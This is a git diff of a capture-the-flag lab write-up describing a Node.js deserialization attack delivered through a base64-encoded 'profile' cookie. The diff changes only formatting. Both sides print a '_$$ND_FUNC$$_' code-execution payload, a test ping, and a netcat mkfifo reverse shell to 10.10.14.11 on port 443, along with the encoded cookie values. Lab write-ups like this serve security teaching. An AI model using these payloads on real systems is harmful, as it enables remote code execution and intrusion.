@@ -29,7 +29,7 @@ If we refresh the page in a browser, the same request is sent except that it now
 If we base64-decode the content of the `profile` cookie, we get the JSON object below. An interesting thing to note here is that the `username` and `num` variables appear to have been used the second time we visited [http://10.10.10.85:3000](http://10.10.10.85:3000).
 
 {% highlight none linenos %}
-kali@kali:/tmp/x$ echo "eyJ[...]Q==" | base64 -d
+kali@kali:/tmp/x$ @@echo "eyJ[...]Q==" | base64 -d@@
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
 {% endhighlight %}
 
@@ -46,10 +46,10 @@ We can base64 encode this JSON object using the command `echo '[JSON]' | base64 
 A solution to this problem is to substitute the single quotes for the characters `'"'"'`. By substituting a single quote character in a string for these characters, the original string is split into three strings which bash automatically concatenates. The second of these strings is defined using double quotes and only contains a single quote character, thus "escaping" the single quote. In essence, we can base64 encode our JSON object as shown below. Note that the `-w` flag is used to prevent the `base64` command from splitting the base64 encoded string into multiple lines.
 
 {% highlight none linenos %}
-kali@kali:~$ JSON='{"evil":"_$$ND_FUNC$$_function (){require('"'"'child_process'"'"').exec('"'"'ping -c 10 10.10.14.11'"'"'); }()"}'
-kali@kali:~$ echo $JSON
+kali@kali:~$ @@JSON='{"evil":"_$$ND_FUNC$$_function (){require('"'"'child_process'"'"').exec('"'"'ping -c 10 10.10.14.11'"'"'); }()"}'@@
+kali@kali:~$ @@echo $JSON@@
 {"evil":"_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 10 10.10.14.11'); }()"}
-kali@kali:~$ echo $JSON | base64 -w0
+kali@kali:~$ @@echo $JSON | base64 -w0@@
 eyJldmlsIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDEwIDEwLjEwLjE0LjExJyk7IH0oKSJ9Cg==
 {% endhighlight %}
 
@@ -61,15 +61,15 @@ The next step is to get a shell on the target host. A useful command for reverse
 
 We place this command in our JSON object and base64 encode the JSON object, as explained earlier. Next, we send a new request to the web application where the value of the `profile` cookie is the base64 encoded string we just generated. Shortly after sending the request, we can see ICMP echo requests from the target host in Wireshark and the target host thus has `nc` installed. As `nc` is installed, we can use the reverse shell payload below to get a shell on the target host.
 
-{% highlight bash linenos %}
+{% highlight plain linenos %}
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f
 {% endhighlight %}
 
 We place the reverse shell payload into our JSON object and base64 encode it as shown below.
 
 {% highlight none linenos %}
-kali@kali:~$ JSON='{"evil":"_$$ND_FUNC$$_function (){require('"'"'child_process'"'"').exec('"'"'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f'"'"'); }()"}'
-kali@kali:~$ echo $JSON | base64 -w0
+kali@kali:~$ @@JSON='{"evil":"_$$ND_FUNC$$_function (){require('"'"'child_process'"'"').exec('"'"'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f'"'"'); }()"}'@@
+kali@kali:~$ @@echo $JSON | base64 -w0@@
 eyJldmlsIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpe3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfHNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTEgNDQzID4vdG1wL2YnKTsgfSgpIn0K
 {% endhighlight %}
 
